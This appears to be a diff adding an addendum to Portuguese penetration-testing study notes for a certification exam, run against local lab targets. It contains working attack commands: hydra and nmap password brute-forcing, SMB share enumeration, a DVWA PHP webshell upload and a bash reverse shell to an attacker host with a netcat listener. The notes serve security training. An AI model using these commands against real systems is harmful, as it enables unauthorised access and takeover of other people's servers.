@@ -678,5 +678,78 @@ nmap -p22 --script ssh-brute --script-args userdb=users.txt,passdb=pass.txt IP
 ```
 Hoje: `msfadmin:msfadmin` achado em 0,1 s contra o lab em 127.0.0.1:2222.
 
+---
+
+# ADENDO 23/OUT — REVALIDAÇÃO DA VÉSPERA (tudo abaixo rodou hoje)
+
+## G.1 hydra — o veredito correto não é "não presta", é "só onde ele tem módulo"
+```bash
+# FUNCIONA (testado hoje 18:08, alvo vsftpd 3.0.2 em 127.0.0.1:2121)
+hydra -l msfadmin -P ~/wordlists/pass/top10k.txt -t 4 -f ftp://IP:21
+# -> [21][ftp] host: IP  login: msfadmin  password: msfadmin   (1 s)
+
+# NÃO FUNCIONA nesta máquina
+hydra ... ssh://IP          # [ERROR] Compiled without LIBSSH
+hydra ... rdp://IP          # idem
+
+# HTTP-POST: só com F= explícito E confirmação na mão depois
+hydra -l admin -P ~/wordlists/pass/top1000.txt IP -s 8080 http-post-form \
+  "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
+# token CSRF (DVWA) quebra esse comando -> usar web_login.py + sqlmap/requests
+```
+Regra: **hydra que "achou" não é prova.** Confirmar sempre (`curl -i`, `ssh`, cliente do serviço).
+
+## G.2 nmap — não misturar `-sV` com lista de scripts
+Hoje `nmap -sV --script "ftp-anon,ftp-syst,ftp-vsftpd-backdoor"` disparou `vmware-version` e
+`rpcinfo` (erro) numa porta FTP — ruído de version-detection. Faça em duas etapas:
+```bash
+nmap -Pn -sV -p 21 IP
+nmap -Pn -p 21 --script ftp-anon,ftp-syst IP       # scripts puros, saída limpa
+```
+Os scripts moram em `/snap/nmap/5432/usr/share/nmap/scripts` (o caminho `/snap/nmap/current/share/...`
+não existe). Teste de vida: `nmap --script-help http-enum`.
+
+## G.3 SMB no lab — IPs e a verdade sobre MS17-010
+```bash
+nmap -Pn -p 445 --script smb-os-discovery,smb-security-mode,smb-enum-shares 172.28.77.11
+```
+Resultado real hoje: host `SRVLEGACY`, workgroup `LAB`, SMB1 (NT1), signing off, guest READ/WRITE em
+`publico` e `IPC$`, `financeiro`/`rh` sem acesso anônimo.
+**Limite honesto:** é Samba, não Windows — `smb_ms17_010` responde "does NOT appear vulnerable"
+(correto). EternalBlue só se treina em Windows (HTB/Metasploitable3). No exame, se o 445 for Windows,
+o fluxo do Cenário A vale integralmente; se for Samba, o alvo é enumeração + creds fracas.
+
+## G.4 Python do lab — a regra que quebra scripts
+```bash
+~/venvs/pentest/bin/python ~/LIBERTUS/ejpt/web_login.py -u http://IP/login.php -l admin -p password
+# instalar algo NO VENV (não existe bin/pip):
+uv pip install --python ~/venvs/pentest/bin/python <pacote>
+```
+`pip3` do PATH instala no Python 3.14 do Hermes — não no venv. `python3` puro não tem paramiko/requests.
+
+## G.5 tempos reais medidos hoje (para não travar no exame)
+| Ação | Tempo |
+|---|---|
+| `nmap -sV -p- -T4` num host de lab | 1–4 min |
+| `gobuster` common.txt (4.750) | ~15 s |
+| `sqlmap --dbs` autenticado | ~40 s |
+| hydra FTP 10k senhas, 1 user | ~2–5 min |
+| `smb-enum-shares` | ~35 s (script pesado) |
+
+## G.6 Web → RCE: upload de webshell validado hoje (ponta a ponta)
+```bash
+printf '<?php system($_GET["c"]); ?>' > /tmp/shell.php
+curl -s -b "PHPSESSID=XXX; security=low" \
+  -F "uploaded=@/tmp/shell.php;type=image/jpeg" -F "Upload=Upload" \
+  http://IP/vulnerabilities/upload/
+curl -s "http://IP/hackable/uploads/shell.php?c=id"        # -> uid=33(www-data)
+# reverse (URL-encode o comando):
+# bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'
+nc -lvnp 4444
+```
+Hoje a conexão voltou e o shell respondeu `id`, `hostname` e `pwd`. Botão é `Upload` (U maiúsculo).
+
+
+
 
 
